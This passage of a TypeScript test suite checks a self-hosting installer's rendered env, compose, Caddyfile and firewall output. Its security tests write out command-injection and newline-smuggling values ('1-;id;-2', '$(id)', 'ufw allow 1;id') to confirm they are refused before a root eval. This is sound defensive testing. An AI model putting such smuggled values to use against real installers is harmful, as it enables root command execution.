    const r = spawnSync('sh', ['-c', `openssl req -x509 -newkey rsa:2048 -nodes -sha256 -days 30 -keyout ${key} -out ${crt} -subj '/CN=*.example.test' -addext 'subjectAltName=DNS:*.example.test,DNS:*.s3.example.test,DNS:example.test' 2>/dev/null`], { encoding: 'utf8' })
    if (r.status !== 0) throw new Error(`openssl failed: ${r.stderr}`)
  }
  try {
    // A CHAIN, live -> links -> archive: the middle hop is not mounted, so the configured path
    // dangles inside both containers. Refused before anything is written or restarted.
    for (const d of ['live', 'links', 'archive']) mkdirSync(join(root, d), { recursive: true })
    mint(join(root, 'archive', 'cert.pem'), join(root, 'archive', 'key.pem'))
    symlinkSync('../archive/cert.pem', join(root, 'links', 'cert.pem'))
    symlinkSync('../links/cert.pem', join(root, 'live', 'cert.pem'))
    const chained = tryRun(['--print-compose', '--tls', 'custom',
      '--tls-cert', join(root, 'live', 'cert.pem'), '--tls-key', join(root, 'archive', 'key.pem'),
    ], { INSTA_OSS_DOMAIN: 'example.test' })
    expect(chained.status).toBe(1)
    expect(chained.stderr).toContain('is itself a symlink')

    // A symlinked DIRECTORY on the way (le -> real, as when /etc/letsencrypt lives on another
    // volume). Inside the container the certbot link is walked from <root>/le/live/x, so it lands
    // in <root>/le/archive/x: that is what has to be mounted, not the physical directory the host
    // reaches through the symlink.
    mkdirSync(join(root, 'real', 'live', 'x'), { recursive: true })
    mkdirSync(join(root, 'real', 'archive', 'x'), { recursive: true })
    mint(join(root, 'real', 'archive', 'x', 'fullchain1.pem'), join(root, 'real', 'archive', 'x', 'privkey1.pem'))
    symlinkSync('../../archive/x/fullchain1.pem', join(root, 'real', 'live', 'x', 'fullchain.pem'))
    symlinkSync('../../archive/x/privkey1.pem', join(root, 'real', 'live', 'x', 'privkey.pem'))
    symlinkSync(join(root, 'real'), join(root, 'le'))
    const compose = run(['--print-compose', '--tls', 'custom',
      '--tls-cert', join(root, 'le', 'live', 'x', 'fullchain.pem'),
      '--tls-key', join(root, 'le', 'live', 'x', 'privkey.pem'),
    ], { INSTA_OSS_DOMAIN: 'example.test' })
    const mounts = compose.split('\n').filter((l) => l.trim().endsWith(':ro'))
    expect(mounts.some((l) => l.includes('/le/archive/x:')), mounts.join('\n')).toBe(true)
    expect(mounts.some((l) => l.includes('/real/archive/x:')), mounts.join('\n')).toBe(false)
  } finally {
    rmSync(root, { recursive: true, force: true })
  }
})

test('an ACME email is an email, or absent', () => {
  // Same ending as the domain: it is rendered into the Caddyfile and a malformed address is
  // rejected by the CA after the install rather than before it. Empty stays legitimate.
  for (const bad of ['not-an-email', 'a@b', 'a@.b.test', '@example.test', 'a b@example.test']) {
    const r = tryRun(['--print-env', '--email', bad], { INSTA_OSS_DOMAIN: 'example.test' })
    expect(r.status, bad).toBe(1)
    expect(r.stderr, bad).toContain('is not an email address')
  }
  expect(parseEnv(run(['--print-env', '--email', 'ops@example.test'], { INSTA_OSS_DOMAIN: 'example.test' })).INSTA_OSS_ACME_EMAIL)
    .toBe('ops@example.test')
  expect(parseEnv(run(['--print-env'], { INSTA_OSS_DOMAIN: 'example.test' })).INSTA_OSS_ACME_EMAIL).toBe('')
})

test('INSTA_OSS_PUBLIC_IP=203.0.113.7 --print-env yields INSTA_OSS_DOMAIN=203-0-113-7.sslip.io', () => {
  const env = parseEnv(run(['--print-env'], { INSTA_OSS_PUBLIC_IP: '203.0.113.7' }))
  expect(env.INSTA_OSS_DOMAIN).toBe('203-0-113-7.sslip.io')
  expect(env.INSTA_OSS_PUBLIC_IP).toBe('203.0.113.7')
  // an explicit domain wins over the auto one; the ip is still recorded for the daemon's DNS hints
  expect(parseEnv(run(['--print-env'], { INSTA_OSS_PUBLIC_IP: '203.0.113.7', INSTA_OSS_DOMAIN: 'shop.example' })).INSTA_OSS_DOMAIN).toBe('shop.example')
})

test('pass-through: INSTA_OSS_IDLE_COMPUTE_SEC=15 and an unknown INSTA_OSS_* key land in --print-env', () => {
  const env = parseEnv(run(['--print-env'], { INSTA_OSS_DOMAIN: 'example.test', INSTA_OSS_IDLE_COMPUTE_SEC: '15', INSTA_OSS_FUTURE_KNOB: 'yes' }))
  expect(env.INSTA_OSS_IDLE_COMPUTE_SEC).toBe('15')
  expect(env.INSTA_OSS_FUTURE_KNOB).toBe('yes')
  // a non-INSTA_OSS variable is never written
  expect(run(['--print-env'], { INSTA_OSS_DOMAIN: 'example.test', HOME: '/root', SOMETHING_ELSE: '1' })).not.toMatch(/^(HOME|SOMETHING_ELSE)=/m)
})

test('--print-compose: host networking, the socket and the data dir bound at the identical path, the three container names, no ports on instad', () => {
  const out = run(['--print-compose'])
  expect(out).toContain('name: instacloud')
  expect(out).toContain('image: ${INSTA_OSS_IMAGE}:${INSTA_OSS_VERSION}')
  expect(out).toContain('- /var/run/docker.sock:/var/run/docker.sock')
  expect(out).toContain('- /var/lib/instacloud:/var/lib/instacloud')
  expect(out).toContain('env_file: instad.env')
  for (const c of ['io-instad', 'io-edge', 'io-garage']) expect(out).toContain(`container_name: ${c}`)
  const instad = out.slice(out.indexOf('  instad:'), out.indexOf('  edge:'))
  expect(instad).toContain('network_mode: host')
  expect(instad).toContain('init: true')
  expect(instad).toContain('stop_grace_period: 30s')
  expect(instad).toContain('restart: unless-stopped')
  expect(instad).not.toContain('ports:')
  const edge = out.slice(out.indexOf('  edge:'), out.indexOf('  garage:'))
  expect(edge).toContain('network_mode: host')
  expect(edge).toContain('- ./Caddyfile:/etc/caddy/Caddyfile:ro')
  expect(edge).toContain('/var/lib/instacloud/caddy/data:/data')     // the cert store the daemon reads (INSTA_OSS_TLS_CERT_DIR)
  const garage = out.slice(out.indexOf('  garage:'))
  expect(garage).not.toContain('network_mode: host')                 // stays on the bridge: the daemon attaches it to branch networks
  expect(garage).toContain('- 127.0.0.1:3900:3900')
  expect(garage).toContain('- 127.0.0.1:3902:3902')
  expect(garage).toContain('/var/lib/instacloud/garage/garage.toml:/etc/garage.toml:ro')
  // decision 46: the compose name must equal the handle the storage adapter execs into, which is
  // the one constant the adapter and the engine share.
  expect(readFileSync(join(ROOT, 'src', 'manageddb.ts'), 'utf8')).toContain("export const GARAGE_CONTAINER = 'io-garage'")
  expect(readFileSync(join(ROOT, 'src', 'adapters', 'garage.ts'), 'utf8')).toContain('const GARAGE = GARAGE_CONTAINER')
  // The data directory is the one value baked in, and on purpose: compose interpolation lets the
  // calling shell outrank --env-file, so a stray INSTA_OSS_DATA_DIR in an operator's environment
  // would move every bind above. The image and the version stay late-bound, so editing instad.env
  // is still how the running tag changes.
  const elsewhere = run(['--print-compose'], { INSTA_OSS_DATA_DIR: '/srv/x', INSTA_OSS_VERSION: '9.9.9' })
  expect(elsewhere).toContain('- /srv/x:/srv/x')
  expect(elsewhere).toContain('- /srv/x/garage/meta:/var/lib/garage/meta')
  expect(elsewhere).toContain('image: ${INSTA_OSS_IMAGE}:${INSTA_OSS_VERSION}')
  expect(elsewhere).not.toContain('9.9.9')
  expect(elsewhere).not.toContain('/var/lib/instacloud')
})

test('--print-caddyfile: ask on the internal port, on_demand, acme then internal; --tls internal drops issuer acme', () => {
  const acme = run(['--print-caddyfile'], { INSTA_OSS_TLS: 'acme' })
  expect(acme).toContain('ask http://127.0.0.1:8081/tls/ask')
  expect(acme).toContain('admin off')
  expect(acme).toContain('on_demand')
  expect(acme.indexOf('issuer acme')).toBeGreaterThan(-1)
  expect(acme.indexOf('issuer acme')).toBeLessThan(acme.indexOf('issuer internal'))
  expect(acme).toContain('reverse_proxy 127.0.0.1:8080')
  expect(acme).toContain('header_up X-Forwarded-Proto https')
  expect(acme).toContain('redir https://{host}{uri} permanent')
  expect(acme).not.toContain('email')                       // omitted when INSTA_OSS_ACME_EMAIL is empty
  const internal = run(['--print-caddyfile'], { INSTA_OSS_TLS: 'internal', INSTA_OSS_ACME_EMAIL: 'ops@example.test' })
  expect(internal).not.toContain('issuer acme')
  expect(internal).toContain('issuer internal')
  expect(internal).toContain('email ops@example.test')
  // the ports follow instad.env, not the defaults
  const moved = run(['--print-caddyfile'], { INSTA_OSS_PORT: '9080', INSTA_OSS_INTERNAL_PORT: '9081' })
  expect(moved).toContain('ask http://127.0.0.1:9081/tls/ask')
  expect(moved).toContain('reverse_proxy 127.0.0.1:9080')
})

test('curl and iproute2 are installed before anything is resolved, and the print modes skip that', () => {
  // A stock Ubuntu or Debian image has neither. Resolving the release tag and the public address
  // needs curl, and the offline address fallback and the port check need ip and ss, so a bootstrap
  // that ran after the resolve block turned a missing tool into "could not detect a public IPv4
  // address" on a box with perfectly good networking.
  const preflight = script.indexOf('preflight() {')
  expect(preflight).toBeGreaterThan(-1)
  expect(preflight).toBeLessThan(script.indexOf('detect_ip() {'))
  expect(preflight).toBeLessThan(script.indexOf('latest_release() {'))
  expect(script).toContain('[ -n "$PRINT" ] || preflight')
  expect(script).toContain('have curl || pkg_install curl || die')
  expect(script).toContain('pkg_install iproute2')
  // the print modes stay root-free: they must not go through preflight
  expect(run(['--print-daemon-json'])).toContain('default-address-pools')
})

test('systemd is detected by whether it runs the box, not by systemctl being on PATH', () => {
  // get.docker.com pulls systemd in as a dependency, so systemctl exists on hosts that boot
  // something else, where every unit call fails with "System has not been booted with systemd".
  expect(script).toContain('systemd_running() { have systemctl && [ -d /run/systemd/system ]; }')
  expect(script).not.toMatch(/if have systemctl; then systemctl/)
  expect(script).toContain('elif have service && [ -x /etc/init.d/docker ]; then service docker restart')
  // an installed but stopped daemon is started before the stack is touched
  expect(script).toContain('log "Docker is installed but not answering: starting it"')
})

test('an upgrade keeps the always-on default its instad.env already has', () => {
  // Every install before this default flipped wrote INSTA_OSS_ALWAYS_ON_DEFAULT=0. Re-running the
  // installer must not turn those boxes always-on underneath their operators: always-on services
  // are never evicted, so a silent flip changes how much memory a running box holds.
  const cfg = mkdtempSync(join(tmpdir(), 'io-upg-'))
  try {
    writeFileSync(join(cfg, 'instad.env'), 'INSTA_OSS_DOMAIN=example.test\nINSTA_OSS_ALWAYS_ON_DEFAULT=0\n')
    expect(parseEnv(run(['--print-env'], { IO_CFG_DIR: cfg })).INSTA_OSS_ALWAYS_ON_DEFAULT).toBe('0')
    // ...and it is the existing file doing that, not the default: without the key the same
    // upgrade renders the new default.
    writeFileSync(join(cfg, 'instad.env'), 'INSTA_OSS_DOMAIN=example.test\n')
    expect(parseEnv(run(['--print-env'], { IO_CFG_DIR: cfg })).INSTA_OSS_ALWAYS_ON_DEFAULT).toBe('1')
  } finally {
    rmSync(cfg, { recursive: true, force: true })
  }
})

test('.env is symlinked to instad.env so a plain docker compose in $CFG interpolates', () => {
  // compose interpolates ${VAR} from the shell and from .env in the project directory, never from
  // env_file, so without this every documented bare command there resolved the image to ':'.
  expect(script).toContain('ln -sfn instad.env "$CFG/.env"')
  const docs = readFileSync(join(ROOT, 'docs', 'self-hosting', 'install.mdx'), 'utf8')
  expect(docs).toContain('`/etc/instacloud/.env`')
  expect(docs).toContain('## Uninstall')
})

test('an auto domain that resolves somewhere other than this box says so', () => {
  expect(script).toContain('ip_is_local() {')
  expect(script).toContain('NAT_NOTE=')
  expect(script).toContain('[ -z "$NAT_NOTE" ] || log "  Note:     $NAT_NOTE"')
})

/** A fake `curl` at the front of PATH playing the cloud metadata service. `aws` answers the IMDSv2
 *  token and public-ipv4, `gcp` answers only Google's path, `none` answers nothing; every call is
 *  logged so the test sees HOW the script asked, not just what it printed. */
function fakeCurl(mode: 'aws' | 'gcp' | 'none', ip: string): { PATH: string; dir: string; log: string } {
  const dir = mkdtempSync(join(tmpdir(), 'io-curlbin-'))
  const log = join(dir, 'calls.log')
  writeFileSync(join(dir, 'curl'), `#!/bin/sh
printf '%s\\n' "$*" >> '${log}'
case "$*" in
  *169.254.169.254/latest/api/token*) [ '${mode}' = aws ] && { printf 'tok123'; exit 0; }; exit 7 ;;
  *169.254.169.254/latest/meta-data/public-ipv4*) [ '${mode}' = aws ] && { printf '${ip}'; exit 0; }; exit 7 ;;
  *computeMetadata*) [ '${mode}' = gcp ] && { printf '${ip}'; exit 0; }; exit 7 ;;
  *) exit 7 ;;
esac
`, { mode: 0o755 })
  return { PATH: `${dir}:${process.env.PATH ?? '/usr/bin:/bin'}`, dir, log }
}

test('the domain note tells a cloud VM from a box behind a router, by asking the metadata service', () => {
  // A cloud VM's public IP is on no interface, so every EC2 install used to print the laptop
  // advice. The metadata service is what separates the two, and this drives the real decision
  // (--print-domain-note runs the same nat_decide the install does) through each answer it can get.
  const note = (mode: 'aws' | 'gcp' | 'none', reported: string): { out: string; calls: string } => {
    const f = fakeCurl(mode, reported)
    try {
      const r = tryRun(['--print-domain-note'], { INSTA_OSS_PUBLIC_IP: '203.0.113.7', PATH: f.PATH })
      return { out: `${r.stdout}${r.stderr}`, calls: existsSync(f.log) ? readFileSync(f.log, 'utf8') : '' }
    } finally {
      rmSync(f.dir, { recursive: true, force: true })
    }
  }
  // AWS reports this very address: the provider's own mapping, so the note is about the firewall.
  const aws = note('aws', '203.0.113.7')
  expect(aws.out).toContain("log: 203.0.113.7 is this cloud VM's public address")
  expect(aws.out).not.toContain('On a laptop VM')
  expect(aws.calls).toMatch(/-X PUT http:\/\/169\.254\.169\.254\/latest\/api\/token/)
  // ...and every metadata request bypassed any proxy, which could otherwise answer for it.
  const meta = aws.calls.split('\n').filter((l) => l.includes('169.254.169.254'))
  expect(meta.length).toBeGreaterThan(0)
  for (const line of meta) expect(line).toContain('--noproxy *')
  // No AWS token, Google answers: the fallback order reaches it.
  expect(note('gcp', '203.0.113.7').out).toContain("this cloud VM's public address")
  // The provider reports a DIFFERENT address: not this box's mapping, so the NAT warning stays.
  expect(note('aws', '198.51.100.9').out).toContain('warn: 203.0.113.7 is not an address of this box (NAT)')
  // No metadata at all: a laptop VM or a home router, and the old warning is unchanged.
  const none = note('none', '203.0.113.7')
  expect(none.out).toContain('is not an address of this box (NAT)')
  expect(none.out).not.toContain('cloud VM')
})

test('the fstab line makes docker.service wait for the data mount (decision 56)', () => {
  expect(script).toContain('"$IMG $DATA xfs loop,nofail,x-systemd.required-by=docker.service,x-systemd.before=docker.service 0 0"')
  expect(script).toContain('mkfs.xfs -q -m reflink=1')
  expect(script).toContain('cp --reflink=always')
})

test('--print-daemon-json renders the branch-network address pool; the script greps daemon.json before writing', () => {
  expect(JSON.parse(run(['--print-daemon-json']))).toEqual({ 'default-address-pools': [{ base: '10.100.0.0/14', size: 24 }] })
  expect(script).toMatch(/grep -q '"default-address-pools"' "\$DAEMON_JSON"/)
  expect(script).toContain('restart_docker')
})

test('--print-firewall lists the docker0 and inbound rules; the script gates them on ufw status / firewall-cmd --state', () => {
  const out = run(['--print-firewall'])
  expect(out).toContain('ufw allow in on docker0 to any port 443,5432,6379,27017 proto tcp')
  expect(out).toContain('ufw allow in on docker0 to any port 20000:20999 proto tcp')
  // 80, 443 and 5432 are the ONLY public ports, on purpose. The redis and mongodb lanes exist
  // and route by SNI, but they are opened to docker0 and the address pools only: an
  // internet-facing Redis or MongoDB on every self-hosted install is a default this project will
  // not ship, so a public lane for them is a rule the operator adds deliberately. The docs say
  // the same (docs/self-hosting/domains.mdx). If that ever changes it is an opt-in flag, and
  // this assertion is where it has to be changed on purpose.
  expect(out).toContain('ufw allow 80,443,5432/tcp')
  // The docker0 and address-pool rules DO carry 6379 and 27017; the public ones must not.
  expect(out).not.toMatch(/ufw allow [0-9,]*(?:6379|27017)/)
  expect(out).not.toMatch(/--zone=public[^\n]*(?:6379|27017)/)
  // branch networks are user-defined bridges, not docker0: the pool itself is allowed too
  expect(out).toContain('ufw allow from 10.100.0.0/14 to any port 443,5432,6379,27017 proto tcp')
  expect(out).toContain('firewall-cmd --permanent --zone=docker --add-port=443/tcp --add-port=5432/tcp --add-port=6379/tcp --add-port=27017/tcp --add-port=20000-20999/tcp')
  expect(out).toContain('firewall-cmd --permanent --zone=public --add-port=80/tcp --add-port=443/tcp --add-port=5432/tcp')
  expect(out).toContain('firewall-cmd --reload')
  expect(script).toMatch(/ufw status 2>\/dev\/null \| grep -q '\^Status: active'/)
  expect(script).toMatch(/firewall-cmd --state/)
  // ...and when it finds NEITHER it restricts nothing, so it has to say so rather than leave the
  // operator believing the lanes are private: they bind 0.0.0.0 in server mode, so 6379 and
  // 27017 are then only as private as the box's own security group. A warning, not a refusal:
  // most of these boxes are protected that way and refusing would break every such install.
  expect(script).toMatch(/no active ufw or firewalld found/)
  expect(script).toMatch(/redis \(\$LANE_REDIS\) and mongodb \(\$LANE_MONGO\)[^\n]*NOT meant to be public/)
  // ...and the applied rule set contains NO SSH rule at all. SSH policy belongs to the
  // operator: an installer that edits it either skips a rule the box needed or widens one that
  // was narrowed on purpose, and both have now happened here. This asserts the absence so the
  // auto-rule cannot be reintroduced by accident.
  expect(out).not.toMatch(/^ufw allow (OpenSSH|\d+\/tcp)$/m)
  expect(out).not.toMatch(/OpenSSH|allow 22\b/)
})

/** A directory of fake `sshd`, `systemctl` and `ss` at the front of PATH, so the detector's real
 *  parse runs. Every advisory case used to inject `IO_SSH_PORTS`, which returns BEFORE the
 *  detector, so those cases exercised the formatter and never the union: the three
 *  `expect(script).toMatch(/systemctl show/)` lines were source greps, and a fallback chain
 *  restored underneath them passed all of it. */
function fakePath(bin: Record<'sshd' | 'systemctl' | 'ss', string>): { PATH: string; dir: string } {
  const dir = mkdtempSync(join(tmpdir(), 'io-sshbin-'))
  for (const [name, body] of Object.entries(bin)) {
    const f = join(dir, name)
    writeFileSync(f, `#!/bin/sh
${body}
`, { mode: 0o755 })
  }
  return { PATH: `${dir}:${process.env.PATH ?? '/usr/bin:/bin'}`, dir }
}

test('ssh detection: socket activation, where the config and the socket DISAGREE', () => {
  // Ubuntu 24.04's default. `systemctl edit ssh.socket` with ListenStream=2222 leaves
  // sshd_config at `#Port 22`, so the config source answers 22 for a box reachable on 2222.
  // A chain that stops at the first answer prints the lockout advice here.
  const { PATH, dir } = fakePath({
    sshd: "echo 'port 22'",
    systemctl: "echo '[::]:2222 (Stream)'",
    ss: 'exit 0',
  })
  try {
    const out = run(['--print-ssh-advice'], { PATH })
    expect(out).toContain('ufw allow 22/tcp')
    expect(out).toContain('ufw allow 2222/tcp')
    expect(out).toMatch(/sshd config and the socket unit report DIFFERENT ports/)
    expect(out.indexOf('2222/tcp')).toBeLessThan(out.indexOf('ufw enable'))
  } finally {
    rmSync(dir, { recursive: true, force: true })
  }
})

test('ssh detection: the config alone, the listener alone, and nothing at all', () => {
  // One source answering is not a disagreement.
  const only = fakePath({ sshd: "echo 'port 2200'", systemctl: 'exit 1', ss: 'exit 0' })
  try {
    const out = run(['--print-ssh-advice'], { PATH: only.PATH })
    expect(out).toContain('ufw allow 2200/tcp')
    expect(out).not.toMatch(/DIFFERENT ports/)
  } finally {
    rmSync(only.dir, { recursive: true, force: true })
  }

  // sshd answers with no port line at all (and so cannot be the source), systemd is not running
  // it, but something IS listening: the third source is the only one that knows.
  const listening = fakePath({
    sshd: "echo 'addressfamily any'",
    systemctl: 'exit 1',
    ss: `echo 'LISTEN 0 128 0.0.0.0:2022 0.0.0.0:* users:(("sshd",pid=1,fd=3))'`,
  })
  try {
    const out = run(['--print-ssh-advice'], { PATH: listening.PATH })
    expect(out).toContain('ufw allow 2022/tcp')
  } finally {
    rmSync(listening.dir, { recursive: true, force: true })
  }

  // Nothing can be established: nothing is asserted, and the substitution is spelled out.
  const silent = fakePath({ sshd: "echo 'addressfamily any'", systemctl: 'exit 1', ss: 'exit 0' })
  try {
    const out = run(['--print-ssh-advice'], { PATH: silent.PATH })
    expect(out).toMatch(/ufw allow OpenSSH\s+# or your own SSH port/)
    expect(out).not.toMatch(/ufw allow [0-9]+\/tcp/)
  } finally {
    rmSync(silent.dir, { recursive: true, force: true })
  }
})

test('every surface that prints a lane port prints the RESOLVED one', () => {
  // The lane-port fix reached the two renderers and not the advisory, which still printed a
  // hardcoded 5432 -- and the advisory is what the no-active-firewall arm prints, the majority
  // case. An operator on a moved lane following our own recipe would `ufw enable` with
  // DEFAULT_INPUT_POLICY=DROP and close the real Postgres lane, silently, because established
  // connections survive. Every surface is asserted together so the next one added is caught.
  const env = { INSTA_OSS_LANE_PG_PORT: '5433', INSTA_OSS_LANE_REDIS_PORT: '6380', INSTA_OSS_LANE_MONGO_PORT: '27018', INSTA_OSS_DOMAIN: 'example.test' }
  const advice = run(['--print-ssh-advice'], env)
  const rules = run(['--print-firewall'], env)
  const envFile = parseEnv(run(['--print-env'], env))

  expect(advice).toContain('ufw allow 80,443,5433/tcp')
  expect(rules).toContain('ufw allow 80,443,5433/tcp')
  expect(rules).toContain('443,5433,6380,27018')
  expect(envFile.INSTA_OSS_LANE_PG_PORT).toBe('5433')
  expect(envFile.INSTA_OSS_LANE_REDIS_PORT).toBe('6380')
  expect(envFile.INSTA_OSS_LANE_MONGO_PORT).toBe('27018')
  // ...and none of them names a displaced default.
  for (const out of [advice, rules]) {
    for (const displaced of ['5432', '6379', '27017']) {
      expect(out, displaced).not.toMatch(new RegExp(`(^|[^0-9])${displaced}([^0-9]|$)`, 'm'))
    }
  }
  // The port preflight and the warning that names the two in-network lanes read the same
  // variables rather than literals.
  expect(script).toContain('need_port "$LANE_PG" ')
  expect(script).toContain('need_port "$LANE_REDIS" ')
  expect(script).toContain('need_port "$LANE_MONGO" ')
  expect(script).toContain('the redis ($LANE_REDIS) and mongodb ($LANE_MONGO) lanes')
})

test('the firewall rules follow the RESOLVED lane ports, and never the displaced defaults', () => {
  // The rules were written with 5432, 6379, 27017 and 20000-20999 hardcoded while the lanes
  // themselves are configurable. A moved lane was unreachable behind an active firewall, and
  // worse: moving the Postgres lane BECAUSE something else holds 5432 meant the installer
  // skipped its own port check on 5432 and then opened it publicly, publishing a stranger's
  // service. The negative half of this test is the half that catches that.
  const moved = run(['--print-firewall'], {
    INSTA_OSS_LANE_PG_PORT: '15432',
    INSTA_OSS_LANE_REDIS_PORT: '16379',
    INSTA_OSS_LANE_MONGO_PORT: '17017',
    INSTA_OSS_LANE_PORT_RANGE: '30000-30099',
  })
  expect(moved).toContain('ufw allow in on docker0 to any port 443,15432,16379,17017 proto tcp')
  expect(moved).toContain('ufw allow in on docker0 to any port 30000:30099 proto tcp')
  expect(moved).toContain('ufw allow 80,443,15432/tcp')
  expect(moved).toContain('--zone=docker --add-port=443/tcp --add-port=15432/tcp --add-port=16379/tcp --add-port=17017/tcp --add-port=30000-30099/tcp')
  expect(moved).toContain('--zone=public --add-port=80/tcp --add-port=443/tcp --add-port=15432/tcp')
  // THE DISPLACED DEFAULTS ARE NOT OPENED. Whatever is on 5432 now is not ours to publish.
  for (const displaced of ['5432', '6379', '27017', '20000:20999', '20000-20999']) {
    // as a whole number, so `15432` does not count as `5432`
    expect(moved, displaced).not.toMatch(new RegExp(`(^|[^0-9])${displaced.replace('-', '\\-')}([^0-9]|$)`, 'm'))
  }
  // ...and the resolved values are what instad.env carries, so the daemon binds what is opened.
  const env = parseEnv(run(['--print-env'], {
    INSTA_OSS_DOMAIN: 'example.test', INSTA_OSS_LANE_PG_PORT: '15432', INSTA_OSS_LANE_PORT_RANGE: '30000-30099',
  }))
  expect(env.INSTA_OSS_LANE_PG_PORT).toBe('15432')
  expect(env.INSTA_OSS_LANE_PORT_RANGE).toBe('30000-30099')
})

/** The shell functions this file tests directly, lifted out of the script so a case can drive
 *  them without running an install. */
function shellHelpers(): string {
  const r = spawnSync('sh', ['-c',
    `sed -n "/^log() /p;/^warn() /p;/^die() /p;/^NL='$/,/^'$/p;/^shaped() /p;/^rule_ok() /p;/^run_rules() {/,/^}/p;/^apply_rules() {/,/^}/p" ${SCRIPT}`,
  ], { encoding: 'utf8' })
  return r.stdout
}

test('a lane RANGE is validated as a whole string, not by its two ends', () => {
  // The root RCE. `${LANE_RANGE%%-*}` reads the text before the FIRST hyphen and
  // `${LANE_RANGE##*-}` the text after the LAST, so a value shaped `1-<anything>-2` had a valid
  // low and a valid high and everything between them was never looked at. It was rendered into
  // a firewall line, and `run_rules` evals those AS ROOT.
  const payloads = [
    '1-;id;-2',
    '1-$(id)-2',
    '1-`id`-2',
    '1-|id|-2',
    '20000 20999',
    '20000--20999',
    '1-2-3',
  ]
  for (const bad of payloads) {
    for (const mode of ['--print-firewall', '--print-env']) {
      const r = tryRun([mode], { INSTA_OSS_LANE_PORT_RANGE: bad, INSTA_OSS_DOMAIN: 'example.test' })
      expect(r.status, `${mode} ${bad}`).toBe(1)
      expect(r.stderr, `${mode} ${bad}`).toContain('INSTA_OSS_LANE_PORT_RANGE')
      expect(r.stdout, `${mode} ${bad}`).not.toContain('id')
    }
  }
  // ...and the shape it is supposed to accept still is.
  expect(run(['--print-firewall'], { INSTA_OSS_LANE_PORT_RANGE: '30000-30099' })).toContain('30000:30099')
})

test('an embedded NEWLINE is refused in every operator value that is checked by shape', () => {
  // The second half of "the whole string, not part of it". `grep` tests each LINE, so a check
  // written `^...$` anchors a line: a value whose FIRST line is well shaped passed it and carried
  // everything after the newline along -- into instad.env, where compose and `--env-file` take
  // the LAST duplicate of a key, into /etc/fstab as a second entry, and into the firewall lines
  // `run_rules` evals as root. Every shape check goes through `shaped` now, which refuses a
  // newline before it looks at anything else.
  // `modes` says where each value is refused: one with a validator of its own is refused while
  // it is resolved, in every mode; one whose only gate is the WRITE is refused by the mode that
  // renders instad.env, and is not read at all by the others.
  const cases: Array<{ key: string; value: string; says: string; modes?: string[] }> = [
    { key: 'INSTA_OSS_LANE_PORT_RANGE', value: '20000-20999\nINSTA_OSS_MODE=local', says: 'INSTA_OSS_LANE_PORT_RANGE' },
    { key: 'INSTA_OSS_DATA_DIR', value: '/var/lib/instacloud\nINSTA_OSS_MODE=local', says: 'INSTA_OSS_DATA_DIR' },
    { key: 'INSTA_OSS_IMAGE', value: 'ghcr.io/insforge/instacloud\nINSTA_OSS_MODE=local', says: 'INSTA_OSS_IMAGE' },
    { key: 'INSTA_OSS_DOMAIN', value: 'example.test\nINSTA_OSS_MODE=local', says: 'is not a hostname' },
    { key: 'INSTA_OSS_PUBLIC_IP', value: '1.2.3.4\nINSTA_OSS_MODE=local', says: 'INSTA_OSS_PUBLIC_IP' },
    // Its own `shaped` check only runs on the install path, so what refuses it in the print
    // modes is the write itself. It was missing from this list, which is how a value quietly
    // stops being tested.
    { key: 'INSTA_OSS_DATA_IMG_GIB', value: '20\nINSTA_OSS_MODE=local', says: 'INSTA_OSS_DATA_IMG_GIB', modes: ['--print-env'] },
    // ...and the family is closed at the write rather than key by key: a pass-through key has
    // no validator of its own, and instad.env takes the LAST duplicate of a key, so an
    // unvalidated value could otherwise rewrite a validated one.
    { key: 'INSTA_OSS_SOMETHING_ELSE', value: 'x\nINSTA_OSS_MODE=local', says: 'INSTA_OSS_SOMETHING_ELSE', modes: ['--print-env'] },
  ]
  for (const { key, value, says, modes } of cases) {
    for (const mode of modes ?? ['--print-env', '--print-firewall']) {
      const r = tryRun([mode], { INSTA_OSS_DOMAIN: 'example.test', [key]: value })
      expect(r.status, `${mode} ${key}`).toBe(1)
      expect(r.stderr, `${mode} ${key}`).toContain(says)
      // ...and nothing of the smuggled line was rendered before the refusal.
      expect(r.stdout, `${mode} ${key}`).not.toContain('INSTA_OSS_MODE=local')
    }
  }
})

test('a value planted in instad.env is refused on the UPGRADE path too', () => {
  // `resolve()` reads the existing instad.env, the docs invite operators to edit it, and
  // re-running the script IS the upgrade. So a bad value planted once would execute as root on
  // every later upgrade with nothing in the environment to see.
  const cfg = mkdtempSync(join(tmpdir(), 'io-cfg-'))
  try {
    writeFileSync(join(cfg, 'instad.env'), 'INSTA_OSS_LANE_PORT_RANGE=1-;id;-2\n')
    const r = tryRun(['--print-firewall'], { IO_CFG_DIR: cfg })
    expect(r.status).toBe(1)
    expect(r.stderr).toContain('INSTA_OSS_LANE_PORT_RANGE')

    // The same for the two other operator values that are read back from there and end up in
    // /etc/fstab and in the compose file.
    writeFileSync(join(cfg, 'instad.env'), 'INSTA_OSS_DATA_DIR=/var/lib/instacloud x\n')
    expect(tryRun(['--print-firewall'], { IO_CFG_DIR: cfg }).stderr).toContain('INSTA_OSS_DATA_DIR')
    writeFileSync(join(cfg, 'instad.env'), 'INSTA_OSS_IMAGE=img;id\n')
    expect(tryRun(['--print-firewall'], { IO_CFG_DIR: cfg }).stderr).toContain('INSTA_OSS_IMAGE')
  } finally {
    rmSync(cfg, { recursive: true, force: true })
  }
})

test('run_rules refuses a line it does not recognise, before the eval', () => {
  // The last line of defence, on the FINAL rendered line: whatever upstream validation misses,
  // or a future edit introduces, a line carrying a shell metacharacter must not reach `eval`.
  const helpers = shellHelpers()
  expect(helpers).toContain('rule_ok()')
  for (const hostile of ['ufw allow 1;id', 'ufw allow $(id)', 'ufw allow `id`', 'ufw allow 1 && id', 'ufw allow 1 > /tmp/x']) {
    const r = spawnSync('sh', ['-c', `${helpers}\nprintf '%s\\n' ${JSON.stringify(hostile)} | run_rules`], { encoding: 'utf8' })
    expect(r.status, hostile).toBe(1)
    expect(r.stderr, hostile).toContain('unexpected characters')
  }
  // ...and a newline cannot smuggle a rule past this layer either: `run_rules` reads a LINE at a
  // time, so a two-line rendering is two rules and each is allowlisted on its own before its
  // eval. (This is why the newline hole above was a hole in the FIRST layer only.)
  const probe = join(tmpdir(), `io-rule-nl-${process.pid}`)
  const two = spawnSync('sh', ['-c', `${helpers}\nprintf '%s\\n' 'ufw allow 443' ${JSON.stringify(`id > ${probe}`)} | run_rules`], { encoding: 'utf8' })
  expect(two.status).toBe(1)
  expect(two.stderr).toContain('unexpected characters')
  expect(existsSync(probe)).toBe(false)
  // ...and every rule the script actually renders passes it, so the allowlist is not theatre.
  const rules = run(['--print-firewall']).split('\n').filter((l) => l && !l.startsWith('#'))
